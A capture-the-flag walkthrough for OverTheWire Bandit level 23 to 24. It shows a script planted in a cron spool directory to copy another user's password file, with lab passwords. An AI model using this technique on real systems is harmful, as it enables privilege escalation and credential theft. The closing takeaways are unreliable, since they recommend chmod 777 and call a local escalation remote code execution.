# Bandit Level 23 → Level 24

| Key | Value |
|:---|:---|
| **Objective** | Exploit an insecure cron spool directory by injecting a custom shell script that executes under `bandit24`'s privileges to copy `/etc/bandit_pass/bandit24`. |
| **Host** | `bandit.labs.overthewire.org` |
| **Port** | `2220` |
| **Username** | `bandit23` |
| **Password** | `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw` |
| **Key Commands** | `cp exploit.sh /var/spool/bandit24/foo/`, `chmod 777` |

---

## 🎯 Challenge Description

A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

---

## 🔬 Technical Analysis

### Insecure Spool Directory Execution Vulnerability
1. **Vulnerability in `/usr/bin/cronjob_bandit24.sh`**:
   ```bash
   cd /var/spool/bandit24/foo
   for i in * .*; do
       if [ "$i" != "." -a "$i" != ".." ]; then
           owner="$(stat --format "%U" ./$i)"
           if [ "${owner}" = "bandit23" ]; then
               timeout -s 9 60 ./$i
           fi
           rm -f ./$i
       fi
   done
   ```
2. **Exploitation Chain**:
   - The cron job executes any file in `/var/spool/bandit24/foo` owned by `bandit23` with the privileges of `bandit24`.
   - We craft a script `/tmp/my_work/exploit.sh` containing `cat /etc/bandit_pass/bandit24 > /tmp/my_work/pass.txt`.
   - Both the script and the target `/tmp/my_work` directory must have world-writable (`chmod 777`) permissions so `bandit24` can create and write to the output file.

---

## 🚀 Solution Walkthrough

### Step 1: Connect via SSH
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
# Password: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
```

### Step 2: Create a Writable Working Directory
```bash
mkdir /tmp/sc1 && chmod 777 /tmp/sc1 && cd /tmp/sc1
```

### Step 3: Write the Exploit Script
```bash
cat << 'EOF' > exploit.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/sc1/pass.txt
EOF

touch pass.txt
chmod 777 exploit.sh
chmod 777 pass.txt
```

### Step 4: Drop the Script into the Cron Spool Directory
```bash
cp exploit.sh /var/spool/bandit24/foo/
```

### Step 5: Wait for Cron Execution (~60s) and Read Password
```bash
cat /tmp/sc1/pass.txt
```
**Output:**
```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

---

## 🔑 Password Found

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

---

## 💡 Key Takeaways

- Privileged cron jobs executing files from world-writable directories represent critical Remote Code Execution (RCE) flaws.
- Ensure shared output directories have `chmod 777` permissions so target processes can write files across user boundaries.

---

[← Previous Level](level_22_to_23.md) | [📋 Summary](README.md) | [Next Level →](level_24_to_25.md)
